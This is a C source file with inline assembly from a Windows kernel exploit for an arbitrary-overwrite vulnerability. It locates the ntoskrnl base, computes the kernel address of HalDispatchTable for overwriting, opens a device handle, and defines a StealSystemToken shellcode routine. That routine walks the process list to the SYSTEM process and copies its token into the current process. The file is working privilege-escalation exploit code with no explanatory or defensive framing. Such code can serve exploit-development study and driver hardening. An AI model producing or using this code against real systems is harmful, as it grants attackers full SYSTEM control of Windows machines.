#include "ArbitraryOverwrite.h"

PDEVICE_DRIVER_INFO GetNtBaseAddr()
{
	PVOID drivers[ARRAY_SIZE];
	CHAR lpBaseName[ARRAY_SIZE];
	DWORD cbNeeded;

	PDEVICE_DRIVER_INFO pNtoskrnlInfo;

	pNtoskrnlInfo = (PDEVICE_DRIVER_INFO)HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			sizeof(DEVICE_DRIVER_INFO)
		);
	if (NULL == pNtoskrnlInfo)
	{
		printf("[-] Allocate memory failed, the error code is 0x%X\n", GetLastError());

		return NULL;
	}

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		if (GetDeviceDriverBaseName(drivers[0], lpBaseName, sizeof(lpBaseName)))
		{
			pNtoskrnlInfo->imageBaseAddr = drivers[0];
			pNtoskrnlInfo->imageName = lpBaseName;

			return pNtoskrnlInfo;
		}
		else
		{
			printf("[-] Get device base name failed, the error code is 0x%X\n", GetLastError());

			return NULL;
		}
	}
	else
	{
		printf("[-] Enum device driver failed, array size needed is %d\n", (int)(cbNeeded / sizeof(PVOID)));

		return NULL;
	}

}

PVOID GetHalTableAddr(PDEVICE_DRIVER_INFO pNtoskrnlInfo)
{
	PVOID halAddrInUserMode = NULL;
	PVOID halAddrInKernelMode = NULL;
	HMODULE hNtoskrnlInUserMode = NULL;

	hNtoskrnlInUserMode = LoadLibraryA(pNtoskrnlInfo->imageName);
	if (NULL == hNtoskrnlInUserMode)
	{
		printf("[-] Load library failed, the error code is 0x%X\n", GetLastError());

		return NULL;
	}

	halAddrInUserMode = (PVOID)GetProcAddress(hNtoskrnlInUserMode, "HalDispatchTable");
	if (NULL == halAddrInUserMode)
	{
		printf("[-] Get HalDispatchTable address failed, the error code is 0x%X\n", GetLastError());

		return NULL;
	}

	halAddrInKernelMode = (PVOID)((ULONG_PTR)halAddrInUserMode - (ULONG_PTR)hNtoskrnlInUserMode + (ULONG_PTR)pNtoskrnlInfo->imageBaseAddr);

	return halAddrInKernelMode;

}

HANDLE GetDeviceHandle(LPCSTR lpFileName)
{
	HANDLE hFile = NULL;

	hFile = CreateFileA(
		lpFileName,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
		);

	return hFile;
}


VOID StealSystemToken()
{
	__asm {
		pushad
		
		xor eax, eax
		mov eax, fs:[eax + KTHREAD_OFFSET]
		mov eax, [eax + EPROCESS_OFFSET]

		mov ecx, eax
		mov edx, SYSTEM_PID

		SearchSystemPID:
			mov eax, [eax + FLINK_OFFSET]
			sub eax, FLINK_OFFSET
			cmp [eax + PID_OFFSET], edx
			jne SearchSystemPID

		mov edx, [eax + TOKEN_OFFSET]
		mov [ecx + TOKEN_OFFSET], edx

		popad

	}
}

